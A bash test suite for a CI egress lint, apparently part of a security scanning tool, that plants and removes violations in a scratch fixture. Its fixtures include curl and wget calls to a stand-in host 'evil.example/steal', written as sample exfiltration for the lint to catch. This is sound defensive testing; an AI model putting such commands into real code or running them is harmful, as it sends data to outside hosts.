#!/usr/bin/env bash
# tests/suites/lint-egress.sh - proves tests/lint-egress.sh both directions.
#
# A CI check that has never been seen to fail is a check nobody has verified
# actually checks anything.  This plants each violation tests/lint-egress.sh
# claims to catch in a throwaway fixture tree (never this repository), asserts
# the lint fails, removes the violation, and asserts the lint passes again.
#
# shellcheck shell=bash
#
# SC2016: assertion prose quotes shell syntax literally.
# shellcheck disable=SC2016

set -Eeuo pipefail
ROOT=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/../.." && pwd -P)
# shellcheck source=lib/core.sh
source "$ROOT/lib/core.sh"
# shellcheck source=tests/lib/assert.sh
source "$ROOT/tests/lib/assert.sh"

FIX=$SCOURSH_SCRATCH/lint-egress-fixture
rm -rf "$FIX"
mkdir -p "$FIX/lib" "$FIX/modules/dast" "$FIX/tools"
# lib/http.sh's mere presence is what makes it the recognised exemption; its
# content does not matter to a lint that only reads OTHER files' invocations.
printf '#!/usr/bin/env bash\nhttp_request() { :; }\n' >"$FIX/lib/http.sh"
printf '#!/usr/bin/env bash\n:\n' >"$FIX/modules/dast/probe.sh"
printf '#!/usr/bin/env bash\n:\n' >"$FIX/tools/update-advisories.sh"

lint() { bash "$ROOT/tests/lint-egress.sh" "$FIX" >/dev/null 2>&1; }

t_case 'baseline fixture is clean'
assert_status 0 'a fixture with no violations passes' lint

t_case 'check 1: a bare curl outside lib/http.sh fails the lint'
printf '#!/usr/bin/env bash\ncurl -s https://evil.example/steal\n' >"$FIX/modules/dast/probe.sh"
assert_status 1 'a bare curl invocation in modules/ is caught' lint
printf '#!/usr/bin/env bash\n:\n' >"$FIX/modules/dast/probe.sh"
assert_status 0 'removing the bare curl restores a clean pass' lint

t_case 'check 1: a bare wget outside lib/http.sh fails the lint too'
printf '#!/usr/bin/env bash\nwget https://evil.example/steal\n' >"$FIX/modules/dast/probe.sh"
assert_status 1 'a bare wget invocation is caught' lint
printf '#!/usr/bin/env bash\n:\n' >"$FIX/modules/dast/probe.sh"
assert_status 0 'removing the bare wget restores a clean pass' lint

t_case 'check 2: a reference to update-advisories from the scan path fails the lint'
printf '#!/usr/bin/env bash\nsource "$(dirname "$0")/../tools/update-advisories.sh"\n' >"$FIX/lib/sneaky.sh"
assert_status 1 'a lib/ file sourcing tools/update-advisories.sh is caught' lint
rm -f "$FIX/lib/sneaky.sh"
assert_status 0 'removing the sourcing file restores a clean pass' lint

t_case 'check 2: calling http_allow_update_endpoint from the scan path fails the lint'
printf '#!/usr/bin/env bash\nhttp_allow_update_endpoint /some/path\n' >"$FIX/modules/dast/probe.sh"
assert_status 1 'a modules/ file calling http_allow_update_endpoint is caught' lint
printf '#!/usr/bin/env bash\n:\n' >"$FIX/modules/dast/probe.sh"
assert_status 0 'removing the call restores a clean pass' lint

rm -rf "$FIX"
t_summary 'lint-egress self-test'
